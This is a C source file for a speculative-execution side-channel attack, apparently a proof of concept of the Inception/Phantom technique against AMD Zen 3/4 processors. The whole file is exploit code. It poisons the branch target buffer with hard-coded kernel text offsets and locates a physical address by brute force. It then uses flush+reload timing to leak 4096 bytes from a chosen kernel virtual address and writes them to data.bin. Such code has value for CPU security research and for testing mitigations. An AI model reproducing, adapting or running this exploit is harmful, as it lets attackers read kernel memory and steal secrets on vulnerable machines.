#define _GNU_SOURCE

#include "../noise.h"
#include "../phys.h"
#include "./sendto.h"
#include <assert.h>
#include <setjmp.h>
#include <signal.h>

/*
    Offsets into kernel text of locations using which the BTB is consulted/indexed,
    that should trigger a PhantomJMP or a recursive PhantomCALL.
*/
#define PHANTOM_JMP  0xd905be
#define PHANTOM_JMP2 0xdbbbac

#define LEAK_PHYS 0x97eefe
#define LEAK_DATA 0x701d3f

/*
    Distances from location using which BTB is indexed to the location of the PhantomJMP
    or recursive PhantomCALL, i.e. number of nops before jmp/call.
*/
#define PHANTOM_JMP_DISTANCE  0
#define PHANTOM_JMP2_DISTANCE 18
#define LEAK_PHYS_DISTANCE    0
#define LEAK_DATA_DISTANCE    50

/*
    Iterations of finding phys adresss and leaking data.
*/
#define PHYS_ITERATIONS      200
#define PER_BIT_ITERATIONS   100
#define PER_GUESS_ITERATIONS 3
#define ADDR_READ_OFFSET     2

/*
    Parameters for Zen 3/4.
*/
#define HUGEPAGE  2097152
#define CACHELINE 64
#define SETS      64
#define WAYS      8
#define PTRN      0xffffbff800000000

/*
    Variables used throughout the attack.
*/
uint64_t base;
uint8_t xor_leaked_val = 0;
sigjmp_buf mark;

uint64_t training_jmp;
uint64_t training_jmp2;
uint64_t training_call;
uint64_t training_call2;
uint64_t victim_phantom_call;
uint64_t victim_phantom_call2;

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile("CPUID\n\t"
                 "RDTSC\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 "CPUID\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

void clean_exit_on_sig(int sig_num) {
    siglongjmp(mark, 1);
}

void set_training_addrs(uint64_t jmp_loc, uint64_t jmp_loc_dist, uint64_t call_loc,
                        uint64_t call_loc_dist) {
    training_jmp = jmp_loc ^ PTRN;
    training_call = call_loc ^ PTRN;
    victim_phantom_call = call_loc;

    mmap((void *) (training_jmp & ~0xfff), 8192, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *) (training_call & ~0xfff), 8192, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);

    memset((void *) training_jmp, 0x90, jmp_loc_dist);
    *(uint32_t *) (training_jmp + jmp_loc_dist) = 0x00d0ff41; // jmp *%r8

    memset((void *) training_call, 0x90, call_loc_dist);
    *(uint32_t *) (training_call + call_loc_dist) = 0x00d0ff41; // call *%r13
}

void unset_training_addrs() {
    munmap((void *) (training_jmp & ~0xfff), 8192);
    munmap((void *) (training_call & ~0xfff), 8192);
}

static inline __attribute__((always_inline)) void insert_p_jmp() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call),
            [br_src] "r"(training_jmp)
            : "r8");
    }
}

static inline __attribute__((always_inline)) void insert_p_call() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call),
            [br_src] "r"(training_call)
            : "r8");
    }
}

static inline __attribute__((always_inline)) int reload_base() {
    __asm__ volatile("mfence\n");
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *) (base);
    uint64_t dt = rdtscp() - t0;
    return !!(dt < 200);
}

uint64_t trigger_inception(uint64_t val, uint64_t val2, uint32_t mask, int iterations) {
    uint64_t res = 0;

    insert_p_call();

    for (int i = 0; i < iterations; i++) {
        insert_p_jmp();
        __asm__ volatile("clflushopt (%0)\n" ::"r"(base));
        trigger_data_leak(val, val2, mask);
        res += reload_base();
    }

    return res;
}

uint8_t leak_byte(unsigned long physmap, unsigned long phys, unsigned long addr) {
    uint8_t leaked = -1;

    for (uint32_t bitval = 1; bitval <= 128; bitval *= 2) {
        while (1) {
            if (trigger_inception(phys + physmap + CACHELINE - 1, addr - ADDR_READ_OFFSET,
                                  bitval, PER_GUESS_ITERATIONS)) {
                leaked -= (uint8_t) bitval;
                break;
            }
            else if (trigger_inception(phys + physmap - 2 * bitval,
                                       addr - ADDR_READ_OFFSET, bitval,
                                       PER_GUESS_ITERATIONS)) {
                break;
            }
        }
    }

    return leaked ^ xor_leaked_val;
}

uint64_t find_phys(uint64_t text, uint64_t physmap) {
    int it = 0;

    set_training_addrs(text + PHANTOM_JMP, PHANTOM_JMP_DISTANCE, text + LEAK_PHYS,
                       LEAK_PHYS_DISTANCE);

    for (int i = 0; i < 3; i++) {
        for (int block = 0; block < phys_blocks.nblocks; block++) {
            for (uint64_t phys_guess = phys_blocks.blocks[block] * phys_blocks.block_size;
                 phys_guess < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                 phys_guess += HUGEPAGE) {
                if (it % 500 == 0) {
                    fflush(stdout);
                }

                if (trigger_inception(0x0, physmap + phys_guess - 0xc0, 0x0,
                                      PHYS_ITERATIONS)) {
                    unset_training_addrs();
                    return phys_guess;
                }

                it++;
            }
        }

        printf("Round %d passed\n", i);
    }

    unset_training_addrs();
    return 0x0;
}

int main(int argc, char *argv[]) {
    srand(time(NULL));

    phys_blocks_init();

    set_cpu_affinity(CORE1);

    sendto_init();

    assert(argc == 4);

    // secret_ptr is the kernel virtual address from which we want to leak, and is
    // user-provided
    unsigned long secret_ptr = strtoul(argv[3], NULL, 16);

    signal(SIGSEGV, clean_exit_on_sig);

    base = (uint64_t) aligned_alloc(HUGEPAGE, HUGEPAGE);
    madvise((void *) base, HUGEPAGE, MADV_HUGEPAGE);
    mprotect((void *) base, HUGEPAGE, PROT_READ | PROT_WRITE | PROT_EXEC);

    *(uint64_t *) (base + 1000) = 0;

    uint64_t text = strtoul(argv[1], NULL, 16);
    uint64_t physmap = strtoul(argv[2], NULL, 16);

    pid_t sibling_proc = run_sibling_noise("./workload", CORE2);

    uint64_t phys = find_phys(text, physmap);
    if (phys == 0x0)
        return 1;

    set_training_addrs(text + PHANTOM_JMP, PHANTOM_JMP_DISTANCE, text + LEAK_DATA,
                       LEAK_DATA_DISTANCE);

    // Find which value the secret is XORed with in the disclosure gadget
    // physmap + phys + 1000 = base + 1000, which contains 0 (see line 335)
    uint8_t xor_results[256] = {0};
    for (int i = 0; i < 10; i++) {
        xor_results[leak_byte(physmap, phys, physmap + phys + 1000)]++;
    }

    for (int i = 1; i < 256; i++) {
        if (xor_results[i] > xor_results[xor_leaked_val])
            xor_leaked_val = i;
    }

    for (int i = 0; i < 100; i++) {
        *(uint64_t *) (base + 4096 + i) = i % 256;
    }

    time_t start = time(NULL);

    uint8_t buffer[4096];
    for (int k = 0; k < 4096; k++) {
        buffer[k] = leak_byte(physmap, phys, secret_ptr + k);
        printf("%c", buffer[k]);
        fflush(stdout);
    }

    printf("\n");

    time_t end = time(NULL);

    printf("\n\nLeaked 4096 bytes in %ld seconds. That is %ld bytes/s.\n", end - start,
           4096 / (end - start));

    FILE *fptr;
    fptr = fopen("data.bin", "wb");
    fwrite(buffer, 1, 4096, fptr);
    fclose(fptr);

    unset_training_addrs();

    kill(sibling_proc, SIGKILL);

    return 0;
}
